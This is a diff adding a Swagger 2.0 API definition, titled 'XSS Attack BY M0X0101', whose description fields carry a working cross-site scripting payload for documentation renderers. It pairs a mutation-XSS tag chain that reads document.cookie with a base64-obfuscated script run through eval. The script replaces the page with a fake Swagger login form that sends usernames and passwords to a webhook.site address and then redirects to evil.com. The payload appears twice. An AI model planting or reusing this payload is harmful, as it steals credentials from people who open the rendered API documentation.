@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    
+    <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL3dlYmhvb2suc2l0ZS83ZjgxMDMyNS1kNGRiLTQ4ZWItOGIyNy03NDMyNWI0NDZlOWIiO2EubWV0aG9kPSJQT1NUIjthLm9uc3VibWl0PWZ1bmN0aW9uKCl7d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vZXZpbC5jb20ifTthLmlubmVySFRNTD0nPGNlbnRlcj48Yj5GQUtFIHN3YWdnZXIgTG9naW48L2I+PGJyPlVzZXJuYW1lOiA8aW5wdXQgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            
+            <img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL3dlYmhvb2suc2l0ZS83ZjgxMDMyNS1kNGRiLTQ4ZWItOGIyNy03NDMyNWI0NDZlOWIiO2EubWV0aG9kPSJQT1NUIjthLm9uc3VibWl0PWZ1bmN0aW9uKCl7d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vZXZpbC5jb20ifTthLmlubmVySFRNTD0nPGNlbnRlcj48Yj5GQUtFIHN3YWdnZXIgTG9naW48L2I+PGJyPlVzZXJuYW1lOiA8aW5wdXQgbmFtZT0idXNlck5hbWUiPjxicj5QYXNzd29yZDogPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwd2QiPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
